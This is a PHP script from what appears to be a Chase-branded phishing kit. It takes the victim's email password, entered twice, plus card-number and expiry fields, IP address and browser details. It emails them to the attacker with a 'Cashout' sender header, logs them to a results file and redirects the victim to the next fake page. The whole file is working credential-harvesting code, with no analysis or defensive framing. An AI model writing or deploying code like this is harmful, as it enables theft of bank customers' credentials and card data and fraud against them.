<?php
$zabi = getenv("REMOTE_ADDR");
include '../antibots.php';
include('../email.php');
include '../bt.php';
include "../blocker.php";

$message .= "------- Email Access ------\n";
$message .= "Email : ".$_POST['3']."\n";
$message .= "Password : ".$_POST['4']."\n";
$message .= "--Error-\n";
$message .= "Email : ".$_POST['e33']."\n";
$message .= "Password : ".$_POST['e44']."\n";
$message .= "-------- IP Infos --------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "----- 0day -----\n";
$cc = $_POST['ccn'];
$subject = " chase Email acces [ " . $zabi . " ]  ".$_POST['exm']."/".$_POST['exy'];
$headers = "From: Cashout-XXX <service>\r\n";
mail($email,$subject,$message,$headers);
    $text = fopen('../../rezlt.txt', 'a');
fwrite($text, $message);


header("Location: ../synchronize.php");

?>